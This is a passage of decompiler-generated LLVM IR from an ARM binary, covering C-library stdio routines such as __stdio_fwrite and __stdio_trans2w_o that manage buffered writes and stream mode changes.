.preheader:                                       ; preds = %dec_label_pc_13f20, %bb24
  %v0_13f28.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_13f2c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb25

bb25:                                             ; preds = %.preheader, %dec_label_pc_13f4c
  %v2_13f2c = phi i32 [ %v2_13f2c.pre, %.preheader ], [ %v1_13f50, %dec_label_pc_13f4c ]
  %v0_13f28 = phi i32 [ %v0_13f28.pre, %.preheader ], [ %v1_13f38, %dec_label_pc_13f4c ]
  %v1_13f28 = inttoptr i32 %v0_13f28 to i8*
  %v2_13f28 = load i8, i8* %v1_13f28, align 1
  %v3_13f28 = zext i8 %v2_13f28 to i32
  store i32 %v3_13f28, i32* %r3.global-to-local, align 4
  %v3_13f2c = inttoptr i32 %v2_13f2c to i8*
  store i8 %v2_13f28, i8* %v3_13f2c, align 1
  %v0_13f30 = load i32, i32* %r0.global-to-local, align 4
  %v1_13f30 = inttoptr i32 %v0_13f30 to i8*
  %v2_13f30 = load i8, i8* %v1_13f30, align 1
  %v3_13f30 = zext i8 %v2_13f30 to i32
  store i32 %v3_13f30, i32* %r3.global-to-local, align 4
  %v7_13f34 = icmp eq i8 %v2_13f30, 10
  store i1 %v7_13f34, i1* %cpsr_z.global-to-local, align 1
  %v0_13f38 = load i32, i32* %r7.global-to-local, align 4
  %v1_13f38 = add i32 %v0_13f38, 1
  store i32 %v1_13f38, i32* %r7.global-to-local, align 4
  br i1 %v7_13f34, label %dec_label_pc_13f40, label %dec_label_pc_13f4c

dec_label_pc_13f40:                               ; preds = %bb25
  %v0_13f40 = load i32, i32* @r4, align 4
  %v1_13f40 = add i32 %v0_13f40, 1
  %v2_13f40 = inttoptr i32 %v1_13f40 to i8*
  %v3_13f40 = load i8, i8* %v2_13f40, align 1
  %v4_13f40 = zext i8 %v3_13f40 to i32
  store i32 %v4_13f40, i32* %r3.global-to-local, align 4
  %tmp30 = urem i8 %v3_13f40, 2
  %v2_13f44 = icmp eq i8 %tmp30, 0
  store i1 %v2_13f44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13f44, label %dec_label_pc_13f4c, label %dec_label_pc_13f58

dec_label_pc_13f4c:                               ; preds = %dec_label_pc_13f40, %bb25
  %v0_13f4c = load i32, i32* %r6.global-to-local, align 4
  %v1_13f4c = add i32 %v0_13f4c, -1
  store i32 %v1_13f4c, i32* %r6.global-to-local, align 4
  %v7_13f4c = icmp eq i32 %v0_13f4c, 1
  store i1 %v7_13f4c, i1* %cpsr_z.global-to-local, align 1
  %v1_13f50 = add i32 %v0_13f30, 1
  store i32 %v1_13f50, i32* %r0.global-to-local, align 4
  br i1 %v7_13f4c, label %dec_label_pc_13f4c.dec_label_pc_13f58_crit_edge, label %bb25

dec_label_pc_13f4c.dec_label_pc_13f58_crit_edge:  ; preds = %dec_label_pc_13f4c
  %v0_13f58.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13f58

dec_label_pc_13f58:                               ; preds = %dec_label_pc_13f40, %dec_label_pc_13f4c.dec_label_pc_13f58_crit_edge
  %v0_13f5c = phi i32 [ %v1_13f50, %dec_label_pc_13f4c.dec_label_pc_13f58_crit_edge ], [ %v0_13f30, %dec_label_pc_13f40 ]
  %v0_13f58 = phi i32 [ %v0_13f58.pre, %dec_label_pc_13f4c.dec_label_pc_13f58_crit_edge ], [ %v0_13f40, %dec_label_pc_13f40 ]
  %v1_13f58 = add i32 %v0_13f58, 8
  %v2_13f58 = inttoptr i32 %v1_13f58 to i32*
  %v3_13f58 = load i32, i32* %v2_13f58, align 4
  store i32 %v3_13f58, i32* %r3.global-to-local, align 4
  %v2_13f5c = add i32 %v0_13f58, 16
  %v3_13f5c = inttoptr i32 %v2_13f5c to i32*
  store i32 %v0_13f5c, i32* %v3_13f5c, align 4
  %v0_13f60 = load i32, i32* %r3.global-to-local, align 4
  %v1_13f60 = load i32, i32* %r0.global-to-local, align 4
  %v2_13f60 = sub i32 %v1_13f60, %v0_13f60
  store i32 %v2_13f60, i32* %r3.global-to-local, align 4
  %v1_13f64 = load i32, i32* %r5.global-to-local, align 4
  %v2_13f64 = sub i32 %v1_13f64, %v2_13f60
  store i32 %v2_13f64, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13f68

dec_label_pc_13f68:                               ; preds = %dec_label_pc_13efc.dec_label_pc_13f68_crit_edge, %dec_label_pc_13f58
  %v0_13f68 = phi i32 [ %v0_13f68.pre, %dec_label_pc_13efc.dec_label_pc_13f68_crit_edge ], [ %v2_13f64, %dec_label_pc_13f58 ]
  %v1_13f68 = load i32, i32* %r8.global-to-local, align 4
  %v2_13f68 = sub i32 %v1_13f68, %v0_13f68
  store i32 %v2_13f68, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13f6c

dec_label_pc_13ecc.dec_label_pc_13f6c.loopexit_crit_edge: ; preds = %dec_label_pc_13eccthread-pre-split
  %v0_13f6c.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13f6c

dec_label_pc_13f6c:                               ; preds = %entry, %dec_label_pc_13ecc.dec_label_pc_13f6c.loopexit_crit_edge, %dec_label_pc_13f68
  %v0_13f6c = phi i32 [ %v2_13f68, %dec_label_pc_13f68 ], [ %v0_13f6c.pre.pre, %dec_label_pc_13ecc.dec_label_pc_13f6c.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_13f6c, i32* %r0.global-to-local, align 4
  ret i32 %v0_13f6c

; uselistorder directives
  uselistorder i32 %v0_13f6c, { 1, 0 }
  uselistorder i32 %v0_13f58, { 1, 0 }
  uselistorder i32 %v1_13f50, { 0, 2, 1 }
  uselistorder i32 %v0_13f4c, { 1, 0 }
  uselistorder i1 %v2_13f44, { 1, 0 }
  uselistorder i32 %v1_13f38, { 1, 0 }
  uselistorder i32 %v0_13f20, { 1, 0, 2 }
  uselistorder i32 %v5_13f04, { 1, 0 }
  uselistorder i32 %v2_13f04, { 1, 0, 2 }
  uselistorder i32 %v0_13eec, { 1, 0 }
  uselistorder i32 %v4_13ee4, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v5_13ef4, { 0, 2, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 4, 2, 5, 1, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 6, 7, 9, 8, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 (i32, i32*)* @__libc_write, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13f6c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13f68, { 1, 0 }
  uselistorder label %dec_label_pc_13f58, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_13ed8, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13f74 = load i32, i32* @r4, align 4
  store i32 %v3_13f74, i32* %stack_var_-20, align 4
  %v6_13f74 = load i32, i32* @r5, align 4
  %v9_13f74 = load i32, i32* @r6, align 4
  %v12_13f74 = load i32, i32* @r7, align 4
  %v15_13f74 = load i32, i32* @lr, align 4
  %v1_13f78 = add i32 %arg3, 1
  %v2_13f78 = inttoptr i32 %v1_13f78 to i8*
  %v3_13f78 = load i8, i8* %v2_13f78, align 1
  %v4_13f78 = zext i8 %v3_13f78 to i32
  %v3_13f7c = mul nuw nsw i32 %v4_13f78, 256
  %v1_13f80 = and i32 %v3_13f7c, 512
  store i32 %v1_13f80, i32* @r4, align 4
  %v2_13f80 = icmp eq i32 %v1_13f80, 0
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_13f80, label %dec_label_pc_13f94, label %dec_label_pc_14090

dec_label_pc_13f94:                               ; preds = %entry
  %v1_13f94 = add i32 %arg3, 4
  %v2_13f94 = inttoptr i32 %v1_13f94 to i32*
  %v3_13f94 = load i32, i32* %v2_13f94, align 4
  %v1_13f9c = add i32 %arg3, 16
  %v2_13f9c = inttoptr i32 %v1_13f9c to i32*
  %v3_13f9c = load i32, i32* %v2_13f9c, align 4
  store i32 %v3_13f9c, i32* @r0, align 4
  %v1_13fa0 = add i32 %arg3, 12
  %v2_13fa0 = inttoptr i32 %v1_13fa0 to i32*
  %v3_13fa0 = load i32, i32* %v2_13fa0, align 4
  %v4_13fa4 = icmp eq i32 %v3_13f94, -2
  %v2_13fa8 = sub i32 %v3_13fa0, %v3_13f9c
  br i1 %v4_13fa4, label %dec_label_pc_13fa8, label %dec_label_pc_13fd0

dec_label_pc_13fa8:                               ; preds = %dec_label_pc_13f94
  %v3_13fac = icmp ugt i32 %v2_13fa8, %arg2
  br i1 %v3_13fac, label %bb, label %bb10

bb:                                               ; preds = %dec_label_pc_13fa8
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_13fa8, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_13fa8, %dec_label_pc_13fa8 ]
  %v0_13fb4 = phi i32 [ %arg2, %bb ], [ %v2_13fa8, %dec_label_pc_13fa8 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_13fb4, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_13fbc = call i32 @memcpy()
  %v0_13fc0 = load i32, i32* @r5, align 4
  %v1_13fc0 = add i32 %v0_13fc0, 16
  %v2_13fc0 = inttoptr i32 %v1_13fc0 to i32*
  %v3_13fc0 = load i32, i32* %v2_13fc0, align 4
  %v1_13fc4 = load i32, i32* @r4, align 4
  %v2_13fc4 = add i32 %v1_13fc4, %v3_13fc0
  store i32 %v2_13fc4, i32* %v2_13fc0, align 4
  br label %dec_label_pc_140a4

dec_label_pc_13fd0:                               ; preds = %dec_label_pc_13f94
  %tmp = icmp ult i32 %v2_13fa8, %arg2
  br i1 %tmp, label %dec_label_pc_14070, label %dec_label_pc_13fdc

dec_label_pc_13fdc:                               ; preds = %dec_label_pc_13fd0
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_13fe4 = call i32 @memcpy()
  %v0_13fe8 = load i32, i32* @r5, align 4
  %v1_13fe8 = add i32 %v0_13fe8, 16
  %v2_13fe8 = inttoptr i32 %v1_13fe8 to i32*
  %v3_13fe8 = load i32, i32* %v2_13fe8, align 4
  %v1_13fec = add i32 %v0_13fe8, 1
  %v2_13fec = inttoptr i32 %v1_13fec to i8*
  %v3_13fec = load i8, i8* %v2_13fec, align 1
  %v1_13ff0 = load i32, i32* @r6, align 4
  %v2_13ff0 = add i32 %v1_13ff0, %v3_13fe8
  %tmp17 = urem i8 %v3_13fec, 2
  %v2_13ff4 = icmp eq i8 %tmp17, 0
  store i32 %v2_13ff0, i32* %v2_13fe8, align 4
  br i1 %v2_13ff4, label %dec_label_pc_140a4, label %dec_label_pc_14000

dec_label_pc_14000:                               ; preds = %dec_label_pc_13fdc
  %v0_14000 = load i32, i32* %r7.global-to-local, align 4
  %v0_14008 = load i32, i32* @r6, align 4
  %v4_1400c = call i32 @memrchr(i32 %v0_14000, i32 10, i32 %v0_14008, i32 %v2_13ff0)
  %v2_14010 = icmp eq i32 %v4_1400c, 0
  br i1 %v2_14010, label %dec_label_pc_140a4, label %dec_label_pc_14018

dec_label_pc_14018:                               ; preds = %dec_label_pc_14000
  %v0_14018 = load i32, i32* @r5, align 4
  store i32 %v0_14018, i32* @r0, align 4
  %v0_1401c = call i32 @__stdio_wcommit()
  %v2_14020 = icmp eq i32 %v0_1401c, 0
  br i1 %v2_14020, label %dec_label_pc_140a4, label %dec_label_pc_14028

dec_label_pc_14028:                               ; preds = %dec_label_pc_14018
  %v0_14028 = load i32, i32* @r6, align 4
  %v3_14028 = icmp uge i32 %v0_14028, %v0_1401c
  %v0_1401c.v0_14028 = select i1 %v3_14028, i32 %v0_1401c, i32 %v0_14028
  store i32 %v0_1401c.v0_14028, i32* @r4, align 4
  %v2_14034 = sub i32 %v0_14028, %v0_1401c.v0_14028
  %v0_14038 = load i32, i32* %r7.global-to-local, align 4
  %v2_14038 = add i32 %v0_14038, %v2_14034
  store i32 %v2_14038, i32* %r7.global-to-local, align 4
  store i32 %v0_1401c.v0_14028, i32* @r2, align 4
  %v4_14048 = call i32 @__GI_memchr(i32 %v2_14038, i32 10, i32 %v0_1401c.v0_14028, i32 %v2_14034)
  %v2_1404c = icmp eq i32 %v4_14048, 0
  br i1 %v2_1404c, label %dec_label_pc_140a4, label %dec_label_pc_14054

dec_label_pc_14054:                               ; preds = %dec_label_pc_14028
  %v0_14054 = load i32, i32* @r5, align 4
  %v1_14054 = add i32 %v0_14054, 16
  %v2_14054 = inttoptr i32 %v1_14054 to i32*
  %v3_14054 = load i32, i32* %v2_14054, align 4
  %v0_14058 = load i32, i32* %r7.global-to-local, align 4
  %v1_14058 = load i32, i32* @r4, align 4
  %v2_14058 = sub i32 %v0_14058, %v4_14048
  %v2_1405c = add i32 %v2_14058, %v1_14058
  %v2_14060 = sub i32 %v3_14054, %v2_1405c
  %v1_14064 = load i32, i32* @r6, align 4
  %v2_14064 = sub i32 %v1_14064, %v2_1405c
  store i32 %v2_14064, i32* @r6, align 4
  store i32 %v2_14060, i32* %v2_14054, align 4
  br label %dec_label_pc_140a4

dec_label_pc_14070:                               ; preds = %dec_label_pc_13fd0
  %v1_14070 = add i32 %arg3, 8
  %v2_14070 = inttoptr i32 %v1_14070 to i32*
  %v3_14070 = load i32, i32* %v2_14070, align 4
  %v9_14074 = icmp eq i32 %v3_13f9c, %v3_14070
  br i1 %v9_14074, label %dec_label_pc_14090, label %dec_label_pc_1407c

dec_label_pc_1407c:                               ; preds = %dec_label_pc_14070
  store i32 %arg3, i32* @r0, align 4
  %v0_14080 = call i32 @__stdio_wcommit()
  %v2_14084 = icmp eq i32 %v0_14080, 0
  br i1 %v2_14084, label %dec_label_pc_1407c.dec_label_pc_14090_crit_edge, label %bb13

dec_label_pc_1407c.dec_label_pc_14090_crit_edge:  ; preds = %dec_label_pc_1407c
  %v0_14098.pre = load i32, i32* @r6, align 4
  %v0_14090.pre = load i32, i32* @r5, align 4
  %v0_14094.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_1409c.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_14090

bb13:                                             ; preds = %dec_label_pc_1407c
  %v1_14088 = load i32, i32* @r4, align 4
  store i32 %v1_14088, i32* @r6, align 4
  br label %dec_label_pc_140a4

dec_label_pc_14090:                               ; preds = %dec_label_pc_1407c.dec_label_pc_14090_crit_edge, %entry, %dec_label_pc_14070
  %v2_1409c = phi i32 [ %v2_1409c.pre, %dec_label_pc_1407c.dec_label_pc_14090_crit_edge ], [ %v3_13f74, %entry ], [ %v3_13f74, %dec_label_pc_14070 ]
  %v0_14094 = phi i32 [ %v0_14094.pre, %dec_label_pc_1407c.dec_label_pc_14090_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_14070 ]
  %v0_14090 = phi i32 [ %v0_14090.pre, %dec_label_pc_1407c.dec_label_pc_14090_crit_edge ], [ %arg3, %entry ], [ %arg3, %dec_label_pc_14070 ]
  %v0_14098 = phi i32 [ %v0_14098.pre, %dec_label_pc_1407c.dec_label_pc_14090_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_14070 ]
  store i32 %v2_1409c, i32* @r4, align 4
  store i32 %v9_13f74, i32* @r6, align 4
  store i32 %v15_13f74, i32* @lr, align 4
  %v3_140a0 = inttoptr i32 %v0_14090 to i8*
  %v4_140a0 = call i32 @__stdio_WRITE(i8* %v3_140a0, i32 %v0_14094, i32 %v0_14098)
  br label %dec_label_pc_140a4

dec_label_pc_140a4:                               ; preds = %bb13, %dec_label_pc_14028, %dec_label_pc_14018, %dec_label_pc_14000, %dec_label_pc_13fdc, %dec_label_pc_14054, %bb10, %dec_label_pc_14090
  %v0_140a4 = load i32, i32* @r6, align 4
  %v2_140a8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_140a8, i32* @r4, align 4
  store i32 %v6_13f74, i32* @r5, align 4
  store i32 %v9_13f74, i32* @r6, align 4
  store i32 %v12_13f74, i32* @r7, align 4
  ret i32 %v0_140a4

; uselistorder directives
  uselistorder i32 %v2_1405c, { 1, 0 }
  uselistorder i32 %v2_14034, { 1, 0 }
  uselistorder i32 %v0_1401c.v0_14028, { 1, 2, 0, 3 }
  uselistorder i32 %v0_14028, { 1, 0, 2 }
  uselistorder i32 %v2_13fa8, { 2, 0, 1, 3 }
  uselistorder i32 %v9_13f74, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %arg3, { 0, 1, 2, 6, 8, 7, 5, 3, 4 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_140a4, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_14090, { 0, 2, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_140ac = load i32, i32* @r4, align 4
  store i32 %v3_140ac, i32* %stack_var_-8, align 4
  %v3_140b0 = load i8, i8* %arg1, align 1
  %v4_140b0 = zext i8 %v3_140b0 to i32
  store i32 %v4_140b0, i32* %r2.global-to-local, align 4
  %v2_140b4 = add i32 %tmp, 1
  %v3_140b4 = inttoptr i32 %v2_140b4 to i8*
  %v4_140b4 = load i8, i8* %v3_140b4, align 1
  %v5_140b4 = zext i8 %v4_140b4 to i32
  store i32 %v5_140b4, i32* %r3.global-to-local, align 4
  %v4_140b8 = mul nuw nsw i32 %v5_140b4, 256
  %v5_140b8 = or i32 %v4_140b8, %v4_140b0
  store i32 %v5_140b8, i32* %r2.global-to-local, align 4
  %v2_140bc = and i32 %v5_140b8, %arg2
  %v4_140bc = icmp eq i32 %v2_140bc, 0
  store i1 %v4_140bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_140bc, label %dec_label_pc_140c8, label %dec_label_pc_140e0

dec_label_pc_140c8:                               ; preds = %entry
  %v1_140c8 = and i32 %v5_140b8, 2176
  %v2_140c8 = icmp eq i32 %v1_140c8, 0
  store i1 %v2_140c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_140c8, label %dec_label_pc_140d0, label %dec_label_pc_140f4

dec_label_pc_140d0:                               ; preds = %dec_label_pc_140c8
  %v2_140d0 = or i32 %v5_140b8, %arg2
  store i32 %v2_140d0, i32* %r2.global-to-local, align 4
  %v3_140d4 = sdiv i32 %v2_140d0, 256
  store i32 %v3_140d4, i32* %r3.global-to-local, align 4
  %v1_140d8 = trunc i32 %v3_140d4 to i8
  store i8 %v1_140d8, i8* %v3_140b4, align 1
  %v0_140dc = load i32, i32* %r2.global-to-local, align 4
  %v1_140dc = trunc i32 %v0_140dc to i8
  store i8 %v1_140dc, i8* %arg1, align 1
  %v0_140e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_140e0

dec_label_pc_140e0:                               ; preds = %entry, %dec_label_pc_140d0
  %v0_1412c = phi i32 [ %tmp, %entry ], [ %v0_140e0.pre, %dec_label_pc_140d0 ]
  %v1_140e0 = inttoptr i32 %v0_1412c to i8*
  %v2_140e0 = load i8, i8* %v1_140e0, align 1
  %v3_140e0 = zext i8 %v2_140e0 to i32
  store i32 %v3_140e0, i32* %r2.global-to-local, align 4
  %v1_140e4 = add i32 %v0_1412c, 1
  %v2_140e4 = inttoptr i32 %v1_140e4 to i8*
  %v3_140e4 = load i8, i8* %v2_140e4, align 1
  %v4_140e4 = zext i8 %v3_140e4 to i32
  store i32 %v4_140e4, i32* %r3.global-to-local, align 4
  %v4_140e8 = mul nuw nsw i32 %v4_140e4, 256
  %v5_140e8 = or i32 %v4_140e8, %v3_140e0
  store i32 %v5_140e8, i32* @ip, align 4
  %v1_140ec = and i32 %v3_140e0, 32
  %v2_140ec = icmp eq i32 %v1_140ec, 0
  store i1 %v2_140ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_140ec, label %dec_label_pc_1411c, label %dec_label_pc_140f4

dec_label_pc_140f4:                               ; preds = %dec_label_pc_140c8, %dec_label_pc_140e0
  %v0_140f4 = call i32 @__errno_location()
  store i32 %v0_140f4, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_140fc = inttoptr i32 %v0_140f4 to i32*
  store i32 9, i32* %v2_140fc, align 4
  br label %dec_label_pc_14100

dec_label_pc_14100:                               ; preds = %dec_label_pc_14144, %dec_label_pc_140f4
  %v0_14100 = load i32, i32* @r4, align 4
  %v1_14100 = inttoptr i32 %v0_14100 to i32*
  %v2_14100 = load i32, i32* %v1_14100, align 4
  %v1_14104 = or i32 %v2_14100, 8
  store i32 %v1_14104, i32* %r3.global-to-local, align 4
  %v3_14108 = sdiv i32 %v2_14100, 256
  store i32 %v3_14108, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_14110 = trunc i32 %v3_14108 to i8
  %v3_14110 = add i32 %v0_14100, 1
  %v4_14110 = inttoptr i32 %v3_14110 to i8*
  store i8 %v1_14110, i8* %v4_14110, align 1
  %v0_14114 = load i32, i32* %r3.global-to-local, align 4
  %v1_14114 = trunc i32 %v0_14114 to i8
  %v2_14114 = load i32, i32* @r4, align 4
  %v3_14114 = inttoptr i32 %v2_14114 to i8*
  store i8 %v1_14114, i8* %v3_14114, align 1
  %v2_14118 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14118, i32* @r4, align 4
  ret i32 -1

dec_label_pc_1411c:                               ; preds = %dec_label_pc_140e0
  %tmp15 = urem i8 %v2_140e0, 4
  %v2_1411c = icmp eq i8 %tmp15, 0
  store i1 %v2_1411c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1411c, label %dec_label_pc_14180, label %dec_label_pc_14124

dec_label_pc_14124:                               ; preds = %dec_label_pc_1411c
  %v1_14124 = and i32 %v3_140e0, 4
  store i32 %v1_14124, i32* @r1, align 4
  %v2_14124 = icmp eq i32 %v1_14124, 0
  store i1 %v2_14124, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14124, label %dec_label_pc_1412c, label %dec_label_pc_1415c

dec_label_pc_1412c:                               ; preds = %dec_label_pc_14124
  %v1_1412c = add i32 %v0_1412c, 20
  %v2_1412c = inttoptr i32 %v1_1412c to i32*
  %v3_1412c = load i32, i32* %v2_1412c, align 4
  store i32 %v3_1412c, i32* %r2.global-to-local, align 4
  %v1_14130 = add i32 %v0_1412c, 16
  %v2_14130 = inttoptr i32 %v1_14130 to i32*
  %v3_14130 = load i32, i32* %v2_14130, align 4
  store i32 %v3_14130, i32* %r3.global-to-local, align 4
  %v9_14134 = icmp eq i32 %v3_1412c, %v3_14130
  store i1 %v9_14134, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14134, label %dec_label_pc_1413c, label %dec_label_pc_14144

dec_label_pc_1413c:                               ; preds = %dec_label_pc_1412c
  %v1_1413c = and i32 %v3_140e0, 2
  %v2_1413c = icmp eq i32 %v1_1413c, 0
  store i1 %v2_1413c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1413c, label %dec_label_pc_1415c, label %dec_label_pc_14144

dec_label_pc_14144:                               ; preds = %dec_label_pc_1412c, %dec_label_pc_1413c
  %v1_14144 = and i32 %v4_140e8, 1024
  %v2_14144 = icmp eq i32 %v1_14144, 0
  store i1 %v2_14144, i1* %cpsr_z.global-to-local, align 1
  %tmp13 = udiv i32 %v1_14144, 1024
  %tmp14 = add nuw nsw i32 %tmp13, 1
  store i32 %tmp14, i32* @r2, align 4
  %v0_14150 = call i32 @__GI_fseek()
  store i32 %v0_14150, i32* %r0.global-to-local, align 4
  %v2_14154 = icmp eq i32 %v0_14150, 0
  store i1 %v2_14154, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14154, label %.dec_label_pc_1415c_crit_edge, label %dec_label_pc_14100

.dec_label_pc_1415c_crit_edge:                    ; preds = %dec_label_pc_14144
  %v0_1415c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1415c

dec_label_pc_1415c:                               ; preds = %.dec_label_pc_1415c_crit_edge, %dec_label_pc_14124, %dec_label_pc_1413c
  %v2_1416c = phi i32 [ %v0_1415c.pre, %.dec_label_pc_1415c_crit_edge ], [ %v0_1412c, %dec_label_pc_14124 ], [ %v0_1412c, %dec_label_pc_1413c ]
  %v1_1415c = inttoptr i32 %v2_1416c to i32*
  %v2_1415c = load i32, i32* %v1_1415c, align 4
  store i32 %v2_1415c, i32* %r3.global-to-local, align 4
  %v1_14160 = add i32 %v2_1416c, 8
  %v2_14160 = inttoptr i32 %v1_14160 to i32*
  %v3_14160 = load i32, i32* %v2_14160, align 4
  store i32 %v3_14160, i32* %r1.global-to-local, align 4
  %v1_14164 = and i32 %v2_1415c, -4
  store i32 %v1_14164, i32* %r3.global-to-local, align 4
  %v3_14168 = sdiv i32 %v2_1415c, 256
  store i32 %v3_14168, i32* %r2.global-to-local, align 4
  %v1_1416c = trunc i32 %v3_14168 to i8
  %v3_1416c = add i32 %v2_1416c, 1
  %v4_1416c = inttoptr i32 %v3_1416c to i8*
  store i8 %v1_1416c, i8* %v4_1416c, align 1
  %v0_14170 = load i32, i32* %r1.global-to-local, align 4
  %v1_14170 = load i32, i32* @r4, align 4
  %v2_14170 = add i32 %v1_14170, 20
  %v3_14170 = inttoptr i32 %v2_14170 to i32*
  store i32 %v0_14170, i32* %v3_14170, align 4
  %v0_14174 = load i32, i32* %r3.global-to-local, align 4
  %v1_14174 = trunc i32 %v0_14174 to i8
  %v2_14174 = load i32, i32* @r4, align 4
  %v3_14174 = inttoptr i32 %v2_14174 to i8*
  store i8 %v1_14174, i8* %v3_14174, align 1
  %v0_14178 = load i32, i32* %r1.global-to-local, align 4
  %v1_14178 = load i32, i32* @r4, align 4
  %v2_14178 = add i32 %v1_14178, 24
  %v3_14178 = inttoptr i32 %v2_14178 to i32*
  store i32 %v0_14178, i32* %v3_14178, align 4
  %v0_1417c = load i32, i32* %r1.global-to-local, align 4
  %v1_1417c = load i32, i32* @r4, align 4
  %v2_1417c = add i32 %v1_1417c, 16
  %v3_1417c = inttoptr i32 %v2_1417c to i32*
  store i32 %v0_1417c, i32* %v3_1417c, align 4
  %v0_14180.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14180

dec_label_pc_14180:                               ; preds = %dec_label_pc_1411c, %dec_label_pc_1415c
  %v2_1418c = phi i32 [ %v0_1412c, %dec_label_pc_1411c ], [ %v0_14180.pre, %dec_label_pc_1415c ]
  %v1_14180 = inttoptr i32 %v2_1418c to i32*
  %v2_14180 = load i32, i32* %v1_14180, align 4
  %v1_14184 = or i32 %v2_14180, 64
  store i32 %v1_14184, i32* %r2.global-to-local, align 4
  %v3_14188 = sdiv i32 %v2_14180, 256
  store i32 %v3_14188, i32* %r3.global-to-local, align 4
  %v1_1418c = trunc i32 %v3_14188 to i8
  %v3_1418c = add i32 %v2_1418c, 1
  %v4_1418c = inttoptr i32 %v3_1418c to i8*
  store i8 %v1_1418c, i8* %v4_1418c, align 1
  %v0_14190 = load i32, i32* @r4, align 4
  %v1_14190 = add i32 %v0_14190, 1
  %v2_14190 = inttoptr i32 %v1_14190 to i8*
  %v3_14190 = load i8, i8* %v2_14190, align 1
  %v4_14190 = zext i8 %v3_14190 to i32
  %v3_14194 = mul nuw nsw i32 %v4_14190, 256
  store i32 %v3_14194, i32* %r3.global-to-local, align 4
  %v1_14198 = and i32 %v3_14194, 2816
  store i32 %v1_14198, i32* %r0.global-to-local, align 4
  %v2_14198 = icmp eq i32 %v1_14198, 0
  store i1 %v2_14198, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14198, label %bb9, label %.thread1

bb9:                                              ; preds = %dec_label_pc_14180
  %v2_1419c = add i32 %v0_14190, 12
  %v3_1419c = inttoptr i32 %v2_1419c to i32*
  %v4_1419c = load i32, i32* %v3_1419c, align 4
  store i32 %v4_1419c, i32* %r3.global-to-local, align 4
  br label %bb10

.thread1:                                         ; preds = %dec_label_pc_14180
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb10

bb10:                                             ; preds = %bb9, %.thread1
  %v0_141a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_141a4 = trunc i32 %v0_141a4 to i8
  %v3_141a4 = inttoptr i32 %v0_14190 to i8*
  store i8 %v1_141a4, i8* %v3_141a4, align 1
  %v0_141a8 = load i1, i1* %cpsr_z.global-to-local, align 1
